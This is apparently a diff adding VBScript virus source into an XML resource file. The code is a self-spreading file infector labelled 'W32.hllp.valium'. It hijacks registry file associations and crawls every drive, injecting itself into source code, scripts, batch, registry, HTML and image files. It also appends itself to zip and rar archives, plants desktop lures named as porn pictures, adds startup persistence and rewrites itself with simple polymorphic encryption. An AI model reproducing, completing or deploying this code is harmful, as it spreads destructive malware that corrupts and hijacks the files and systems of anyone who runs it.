+Book = excelvir.Application.StartupPath &amp; "\virus.xls"
+Set workbookvir = excelvir.Workbooks.Add
+workbookvir.VBProject.VBComponents.Import "C:\Document.sys"
+excelvir.ActiveWindow.Visible = 0
+workbookvir.SaveAs Book
+Set workbookvir = Nothing
+excelvir.Quit
+Set excelvir = Nothing
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Function to changes *jgp files file same as *vbs files,you will need this to infect graph files
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Set changetype = CreateObject("Wscript.Shell")
+'jgp &lt;-&gt; VBS
+On Error Resume Next
+changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\"
+changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\DefaultIcon\","C:\WINDOWS\WScript.exe,3"
+changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\ScriptEngine\","VBScript"
+changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\ScriptHostEncode\","{85131631-480C-11D2-B1F9-00C04F86C324}"
+changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\Shell\Open\Command\","C:\WINDOWS\WScript.exe " &amp; chr(34) &amp; "%1" &amp; chr(34) &amp; " %*"
+changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\Shell\Play\Command\","C:\WINDOWS\COMMAND\CScript.exe " &amp; chr(34) &amp; "%1" &amp; chr(34) &amp; " %*"
+changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\ShellEx\PropertySheetHandlers\WSHProps\","{60254CA5-953B-11CF-8C96-00AA00B8708C}"
+changetype.regwrite "HKEY_CLASSES_ROOT\.jgp\","jgpFile"
+changetype.regwrite "HKEY_CLASSES_ROOT\jgp\CLSID\","{B54F3741-5B07-11cf-A4B0-00AA004A55E8}"
+changetype.regwrite "HKEY_CLASSES_ROOT\jgp\OLEScript\"
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'TravelDir section begin here
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Self = OpenSelf.Readall
+Set Drives=fso.drives
+For Each Drive in Drives
+If drive.isready then
+	Dosearch drive &amp; "\"
+end If
+Next
+function Dosearch(path)
+
+on error resume next
+Set Folder=fso.getfolder(path)
+Set Files = folder.files
+For Each File in files
+
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Infecting all *cpp,*frm and *pas files
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+If fso.GetExtensionName(file.path)="cpp" then
+on error resume next
+set readcppmarker = fso.OpenTextFile(file.path,1)
+cppmarker = readcppmarker.readline
+cppreadall = readcppmarker.readall
+  if mid(cppreadall,len(cppreadall),1) = "}" then
+      cppreadall1 = replace(cppreadall,mid(cppreadall,len(cppreadall),1),"")
+  end if
+      if cppmarker &lt;&gt; "// W32.hllp.valiumvir" then
+      set readcppmarker = fso.CreateTextFile(file.path, True)
+      readcppmarker.write "// W32.hllp.valiumvir" &amp; vbcrlf &amp; "FILE *valiumv;" &amp; vbcrlf
+      readcppmarker.write cppreadall &amp; "wormvaliumv = fopen("&amp;chr(34)&amp;"valiumv.vbs"&amp;chr(34)&amp;","&amp;chr(34)&amp;"wt"&amp;chr(34)&amp;");" &amp; vbcrlf
+      readcppmarker.write "if(wormvaliumv)"&amp;vbcrlf&amp;"{"&amp; allsourcecpp &amp;vbcrlf&amp;"}" &amp; vbcrlf
+      readcppmarker.write "ShellExecute(NULL, "&amp;chr(34)&amp;"open"&amp;chr(34)&amp;", "&amp;chr(34)&amp;"valiumv.vbs"&amp;chr(34)&amp;", NULL, NULL, SW_SHOWNORMAL);" &amp; vbcrlf
+      readcppmarker.write "}" &amp; vbcrlf
+      readcppmarker.close
+  end if
+end if
+
+If fso.GetExtensionName(file.path)="frm" then
+on error resume next
+set readfrmmarker = fso.OpenTextFile(file.path,1)
+frmmarker = readfrmmarker.readline
+frmreadall = readfrmmarker.readall
+  if frmmarker &lt;&gt; "Rem W32.hllp.Mvbswe" then
+      set readfrmmarker = fso.CreateTextFile(file.path, True)
+      readfrmmarker.write "Rem W32.hllp.valium" &amp; vbcrlf &amp; frmreadall &amp; vbcrlf
+      readfrmmarker.write "Private Sub form_unload(cancel As Integer)" &amp; vbcrlf
+      readfrmmarker.write "On Error GoTo err:" &amp; vbcrlf
+      readfrmmarker.write "Open " &amp; chr(34) &amp; "C:\mvbswe.vbs" &amp; chr(34) &amp; " for output as #1" &amp; vbcrlf
+      readfrmmarker.write allsourcefrm &amp; vbcrlf &amp; "close #1" &amp; vbcrlf &amp; "shell " &amp; chr(34) &amp; "C:\mvbswe.vbs" &amp; chr(34) &amp; vbcrlf
+      readfrmmarker.write "msgbox " &amp; chr(34) &amp; "Your Program has been infected valium virus" &amp; chr(34) &amp; ",VbInformation," &amp; chr(34) &amp; "W32.VBS.Mvbswe" &amp; chr(34)
+      readfrmmarker.write vbcrlf &amp; "exit sub" &amp; vbcrlf &amp; "err:" &amp; vbcrlf &amp; "End sub" &amp; vbcrlf
+      readfrmmarker.close
+  end if
+end if
+
+
+If fso.GetExtensionName(file.path)="pas" then
+on error resume next
+set readpasmarker = fso.OpenTextFile(file.path,1)
+pasmarker = readpasmarker.readline
+pasreadall = readpasmarker.readall
+  if pasmarker &lt;&gt; "{ W32.hllp.valium }" then
+      set readpasmarker = fso.CreateTextFile(file.path, True)
+      readpasmarker.write "{ W32.hllp.valium }" &amp; vbcrlf &amp; pasreadall &amp; vbcrlf
+      readpasmarker.write "procedure " &amp; "TForm1.FormClose(Sender: TObject; var Action: TCloseAction);" &amp; vbcrlf
+      readpasmarker.write "begin" &amp; vbcrlf &amp; "AssignFile (mvbswe,'C:\Windows\STARTM~1\programs\startup\mvbswe.vbs');" &amp; vbcrlf
+      readpasmarker.write "Rewrite (mvbswe);" &amp; vbcrlf &amp; allsourcepas &amp; vbcrlf &amp; "CloseFile(mvbswe);" &amp; vbcrlf
+      readpasmarker.close
+  end if
+end if
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Infecting vbs,vbe files
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+If fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then
+	Set Scripts = FSO.OpenTextFile(File.path, 1, True)
+	If Scripts.ReadLine &lt;&gt; "'valium" then
+		Set Scripts = FSO.OpenTextFile(File.path, 1, True)
+		ScriptsSource = Scripts.ReadAll
+		Set WriteScripts = FSO.OpenTextFile(File.path, 2, True)
+		WriteScripts.WriteLine Self
+		WriteScripts.WriteLine ScriptsSource
+	end if
+end if
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Infecting zip and rar with their internal command
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If fso.GetExtensionName(file.path)="zip" then
+      On error resume next
+      set ws = createobject("wscript.shell")
+      set word = createobject("word.application")
+      appword = word.System.PrivateProfileString("","HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winzip32.exe", "")
+      ws.run appword &amp; " -a -r " &amp; file.path &amp; Chr(32) &amp; " C:\windows\valium.vbs"
+end if
+next
+If fso.GetExtensionName(file.path)="rar" then
+  	on error resume next
+  	set ws = createobject("wscript.shell")
+  	set fso = createobject("Scripting.filesystemobject")
+  	rar1 = "C:\Program Files\WinRAR\WinRAR.exe":rar2 = "D:\Program Files\WinRAR\WinRAR.exe"
+  	if fso.fileexists(rar1) or fso.fileexists(rar2) then
+      		ws.run "WinRAR.exe a " &amp; file.path &amp; " C:\windows\virus.vbs"
+  	end if
+end if
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Open virus body and changes it to js format then gooo eat it
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+If fso.GetExtensionName(file.path)="js" then
+  	set u = fso.opentextfile(Wscript.scriptfullname,1)
+  	uu = u.readall
+  	for i = 1 to len(uu)
+      		a = mid(uu,i,1)
+      		aa = asc(a)
+      		if i &lt;&gt; len(uu)
+          		aaa = replace(uu,a,aa &amp; ",")
+          	else
+          	aaa =  replace(uu,a,aa &amp; ")")
+      	end if
+      	all = all &amp; aaa
+  next
+  u.close
+  set fin = fso.createtextfile(file.path,true)
+  fin.write "var a=string.fromcharcode("&amp;all&amp;vbcrlf
+  fin.write "var b=wscript.createobject("&amp;chr(34)&amp;"scripting.filesystemobject"&amp;chr(34)&amp;").createtextfile("&amp;chr(34)&amp;"aaa.vbs"&amp;chr(34)&amp;")"&amp;vbcrlf
+  fin.write "for(i=0; i&lt;a.length; i++){"&amp;vbcrlf&amp;"try{b.write(a.charAt(i))}"&amp;vbcrlf&amp;"catch(c){}}"&amp;vbcrlf
+  fin.write "WScript.CreateObject("&amp;chr(34)&amp;"WScript.Shell"&amp;chr(34)&amp;").run("&amp;chr(34)&amp;"aaa.vbs"&amp;chr(34)&amp;",0)"
+  fin.close
+End if
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Changes virus body to bat format and goooo infect it
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+If fso.GetExtensionName(file.path)="Bat" then
+	set u = fso.opentextfile(Wscript.scriptfullname)
+	uu = u.readall
+	u.close
+	set e = fso.CreatetextFile(file.path)
+	e.write uu
+	e.writeline ":end"
+	e.close
+	set i = fso.opentextfile(file.path)
+	co = 0
+	do while buff &lt;&gt; ":end"
+		co = co + 1
+		buff = i.readline
+	loop
+	co = co + 14
+	i.close
+	set fin = fso.createtextfile(file.path)
+	fin.writeline "@Echo set ff=createobject(" &amp; chr(34) &amp; "scripting.filesystemobject" &amp; chr(34) &amp; ")&gt;&gt;C:\gen.vbs"
+	fin.writeline "@Echo set rr=ff.opentextfile(" &amp; chr(34) &amp; "%0" &amp; chr(34) &amp; ",1)&gt;&gt;C:\gen.vbs"
+	fin.writeline "@Echo lls=Split(rr.ReadAll,vbCrLf)&gt;&gt;C:\gen.vbs"
+	fin.writeline "@Echo for ii=15 to " &amp; co &amp; " &gt;&gt;C:\gen.vbs"
+	fin.writeline "@Echo newcode=newcode &amp; vbcrlf &amp; lls(ii)&gt;&gt;C:\gen.vbs"
+	fin.writeline "@Echo next&gt;&gt;C:\gen.vbs"
+	fin.writeline "@Echo set ww=ff.createtextfile(ff.getspecialfolder(0) &amp; " &amp; chr(34) &amp; "\vir.vbs" &amp; chr(34) &amp; ",true)&gt;&gt;C:\gen.vbs"
+	fin.writeline "@Echo ww.write newcode&gt;&gt;C:\gen.vbs"
+	fin.writeline "@Echo ww.close&gt;&gt;C:\gen.vbs"
+	fin.writeline "@Echo set ss=createobject(" &amp; chr(34) &amp; "wscript.shell" &amp; chr(34) &amp; ")&gt;&gt;C:\gen.vbs"
+	fin.writeline "@Echo ss.run ff.getspecialfolder(0) &amp; " &amp; chr(34) &amp; "\wscript.exe " &amp; chr(34) &amp; " &amp; ff.getspecialfolder(0) &amp; " &amp; chr(34) &amp; "\vir.vbs %" &amp; chr(34) &amp; ",1,false&gt;&gt;C:\gen.vbs"
+	fin.writeline "@cscript C:\gen.vbs"
+	fin.writeline "@del C:\gen.vbs"
+	fin.writeline "@cls"
+	fin.write uu
+	fin.close
+End if
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Changes virus body to reg format and goooo eat it
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If fso.GetExtensionName(file.path)="reg" then
+  	set openreg = fso.opentextfile(file.path,1)
+	  read = openreg.readall
+	  set createreg = fso.createtextfile(file.path,2)
+	  createreg.write read &amp; vbcrlf
+	  createreg.writeline "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]"
+	  createreg.writeline chr(34)&amp;"executor"&amp;chr(34)&amp;"="&amp;chr(34)&amp;"command /c echo set a=createobject(\"&amp;chr(34)&amp;"Scripting.filesystemobject\"&amp;chr(34)&amp;"):set b=a.opentextfile(\"&amp;chr(34)&amp;"C:\windows\valium.vbs"&amp;chr(34)&amp;"):c=b.readall set d=a.createtextfile(\"&amp;chr(34)&amp;"virus.vbs\"&amp;chr(34)&amp;").write c:createobject(\"&amp;chr(34)&amp;"wscript.shell\"&amp;chr(34)&amp;").run \"&amp;chr(34)&amp;"virus.vbs\"&amp;chr(34)&amp;",0&gt;vir.vbs"&amp;chr(34)
+	  createreg.writeline chr(34)&amp;"executorrun"&amp;chr(34)&amp;"="&amp;chr(34)&amp;"wscript vir.vbs"&amp;chr(34)
+	  createreg.close
+end if
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'HyperText language infection
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+If fso.GetExtensionName(file.path)="html" or fso.GetExtensionName(file.path)="htt" or fso.GetExtensionName(file.path)="htm" or fso.GetExtensionName(file.path)="shtml" then
+	set a = fso.opentextfile(file.path,2)
+	l = a.readline
+	if l &lt;&gt; "&lt;!----&gt;" then
+		b = a.readall
+		set c = fso.opentextfile(Wscript.scriptfullname)
+		bc = c.readall
+		c.close
+		a.writeline "&lt;!----&gt;"
+		a.writeline "&lt;html&gt;&lt;Body&gt;&lt;Script language=" &amp; chr(34) &amp; "VBScript" &amp; chr(34) &amp; "&gt;"
+		a.write bc
+		a.writeline "&lt;" &amp; chr(47) &amp; "script&gt;&lt;/body&gt;&lt;/html&gt;"
+		a.write b
+		a.close
+	end if
+end if
+
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Graphical infection
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+If fso.GetExtensionName(file.path)="bmp" or fso.GetExtensionName(file.path)="jpg" or fso.GetExtensionName(file.path)="gif" or fso.GetExtensionName(file.path)="ico" then
+	on error resume next
+	set fso = createobject("scripting.filesystemobject")
+	set runer = wscript.CreateObject("wscript.shell")
+	set tes = fso.opentextfile(Wscript.Scriptfullname,1)
+	scr = tes.readall
+	bathelp = file.path &amp; ".bat"
+	Set dropper = Fso.Createtextfile(bathelp, True)
+	dropper.writeline "Attrib +h " &amp; file.path
+	dropper.Close
+	runer.run bathelp
+	Fso.Deletefile bathelp
+	vbscopy = file.path &amp; ".jgp"
+	Set dropper2 = Fso.Createtextfile(vbscopy, True)
+	dropper2.write "CreateObject(" &amp; chr(34) &amp; "WScript.Shell" &amp; chr(34) &amp; ").run " &amp; chr(34) &amp; file.path &amp; chr(34) &amp; vbcrlf
+	dropper2.write scr
+	dropper2.Close
+end if
+
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Create lnk file at desktop and link it to the valium(win9x,Me)
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+if fso.FolderExists("C:\windows\Desktop") then
+	on error resume next
+	set shell=wscript.createobject("wscript.shell")
+	set msc=shell.CreateShortCut("C:\windows\Desktop\Porn_pic.jpg.lnk")
+	msc.TargetPath = Shell.ExpandEnvironmentStrings("C:\windows\valium.vbs")
+	msc.WindowStyle = 4
+	msc.Save
+end if
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Create lnk file at desktop and link it to the valium(Xp,Nt)
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+if fso.FolderExists("C:\Documents and Settings\All Users\Desktop") then
+	on error resume next
+	set executor=wscript.createobject("wscript.shell")
+	set msc=executor.CreateShortCut("C:\Documents and Settings\All Users\Desktop\Porno-pic.jpg.lnk")
+	msc.TargetPath = executor.ExpandEnvironmentStrings("C:\windows\valium.vbs")
+	msc.IconLocation = Shell.ExpandEnvironmentStrings("C:\windows\system32\mspaint.exe, 0")
+	msc.WindowStyle = 4
+	msc.Save
+end if
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Nrb infection
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If fso.GetExtensionName(file.path)="nrb" then
+	a = "0E4E65726F49534F302E30322E303301000000010000000000124"
+	b = "E45524F202D204255524E494E4720524F4D0000003428F9403428"
+	c = "F940FFFFFFFFFFFFFFFF000000003428F94001000000000000000"
+	d = "1000000010000000100000001000000074D792044697363074D79"
+	e = "20446973631000000000000000000000000180568737016CC4018"
+	f = "072D545016CC40180568737016CC4010000400000000000000000"
+	g = "0000000002000000433A01000000010700000057494E444F57530"
+	h = "1000000000100000C73797374656D43442E766273200000000000"
+	i = "00000200000000E096F8B33B6CC401002B70BA3B6CC40180B5D34"
+	j = "0016CC40100000010025F5F5F3156434431060001000000040000"
+	k = "00000045444A4F030001000000010002444F535F0E00010000000"
+	l = "C0053595354454D43442E5642534653495A0A0001000000080000"
+	m = "000000000000005052494F0A00020000000400000000000400000"
+	n = "00000454E44210200000000000000000000000000425553546A00"
+	o = "00000000000001000000010000000000000000000000000000000"
+	p = "100000001000000010000000000000000000100FFFFFF7F000000"
+	q = "00000000000100000000000000010000000000000000000000000"
+	r = "000000000000000000100000000000000000000004B4E554A544F"
+	s = "4F4200000000FFFFFFFF2E433A5C50524F4752414D2046494C455"
+	t = "35C41484541445C4E45524F5C4472446F73426F6F74696D616765"
+	u = "2E494D41C0070100020059484F4E534D544217437265617465642"
+	v = "06279204E65726F20457870726573734C4F564A034E4557000000"
+	w = "00124E65726F202D204275726E696E6720524F4D0000000100000"
+	x = "0544E454E4644554E58454F4200000000
+	GenCode = a&amp;b&amp;c&amp;d&amp;e&amp;f&amp;g&amp;h&amp;i&amp;j&amp;k&amp;l&amp;m&amp;n&amp;o&amp;p&amp;q&amp;r&amp;s&amp;t&amp;u&amp;v&amp;w&amp;x
+	For letscount = 1 To Len(GenCode) Step 2
+		NewCode = NewCode &amp; Chr("&amp;h"&amp; Mid(GenCode, letscount, 2))
+	next
+	Set nrbinfector = fso.createtextfile(file.path, True)
+	nrbinfector.write NewCode
+	nrbinfector.close
+end if
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Nri Infection
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If fso.GetExtensionName(file.path)="nri" then
+	a = "0E4E65726F49534F302E30322E3033010000000100000000001"
+	b = "24E45524F202D204255524E494E4720524F4D000000F827F940"
+	c = "F827F940FFFFFFFFFFFFFFFF00000000F827F94001000000000"
+	d = "0000001000000010000000100000000000000074D7920446973"
+	e = "63074D7920446973631000000000000000000000000140CBC31"
+	f = "B016CC401A0811333016CC40140CBC31B016CC4010000400000"
+	g = "0000000000000000000002000000433A0100000001070000005"
+	h = "7494E444F575301000000000100000C73797374656D43442E76"
+	i = "627320000000000000000200000000E096F8B33B6CC401002B7"
+	j = "0BA3B6CC40120B8FD28016CC40100000010025F5F5F31564344"
+	k = "3106000100000004000000000045444A4F03000100000001000"
+	l = "2444F535F0E00010000000C0053595354454D43442E56425346"
+	m = "53495A0A0001000000080000000000000000005052494F0A000"
+	n = "2000000040000000000040000000000454E4421020000000000"
+	o = "0000000000000000425553546A0000000000000001000000010"
+	p = "000000000000000000000000000000100000000000000010000"
+	q = "000000000000000100FFFFFF7F0000000000000000010000000"
+	r = "000000001000000000000000000000000000000000000000000"
+	s = "0100000000000000000000004B4E554A54424F4E59484F4E534"
+	t = "D5442154E65726F20426F6F742D4C6F616465722056332E304C"
+	u = "4F564A034E455700000000124E65726F202D204275726E696E6"
+	v = "720524F4D00000001000000544E454E4644554E45424F4E"
+	GenCode = a&amp;b&amp;c&amp;d&amp;e&amp;f&amp;g&amp;h&amp;i&amp;j&amp;k&amp;l&amp;m&amp;n&amp;o&amp;p&amp;q&amp;r&amp;s&amp;t&amp;u&amp;v
+	For letscount = 1 To Len(GenCode) Step 2
+		NewCode = NewCode &amp; Chr("&amp;h"&amp; Mid(GenCode, letscount, 2))
+	next
+	Set nrinfector = fso.createtextfile(file.path, True)
+	nrinfector.write NewCode
+	nrinfector.close
+end if
+
+Set Subfolders = folder.SubFolders
+For Each Subfolder in Subfolders
+	Dosearch Subfolder.path
+Next
+end function
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Just an crazy tough,simple memory resident for scripts
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+for i = 1 to 20:Set w = CreateObject("Word.application"):Set e = CreateObject("ExCeL.application"):next
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Self destruction
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+if day(now) = 1 and month(now) = 1 and year(now) = 2006 then
+  set fso = createobject("scripting.filesystemobject")
+  fso.deletefile wscript.scriptfullname
+end if
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Polymorph,Self crypting with simple epo,you know it also vulnerable for script,but it need to drop
+'file for buffer characters
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+set fso = createobject("scripting.filesystemobject")
+set op = fso.opentextfile(wscript.scriptfullname,1)
+set parser = fso.Createtextfile("C:\poly.txt",true)
+do while mark &lt;&gt; "'valium"
+  mark = op.readline
+  for i = 1 to len(mark)
+
+      c = mid(mark,i,1)
+      if c = chr(34) then
+          Call Poly
+      else
+          parser.write c
+      end if
+
+      if i = len(mark) then
+          parser.write vbcrlf
+      end if
+  next
+loop
+
+sub Poly()
+Counter = i
+do while enc &lt;&gt; chr(34)
+  Counter = Counter + 1
+  enc = mid(mark,Counter,1)
+  if enc = chr(34) then exit do
+      char = char &amp; enc
+loop
+all = "decrypt(" &amp; chr(34) &amp; strreverse(char) &amp; chr(34) &amp; ")"
+parser.write all
+i = Counter
+end sub
+op.close
+parser.close
+set back = fso.opentextfile("C:\poly.txt",1)
+reader = back.readall
+set wrtall = fso.Createtextfile("C:\poly.txt",true)
+wrtall.write reader
+wrtall.writeline "function decrypt(x)" &amp; vbcrlf &amp; "Decrypt = strreverse(x):end function"
+fso.copyfile "C:\poly.txt",wscript.scriptfullname</value>
+  </data>
+</root>
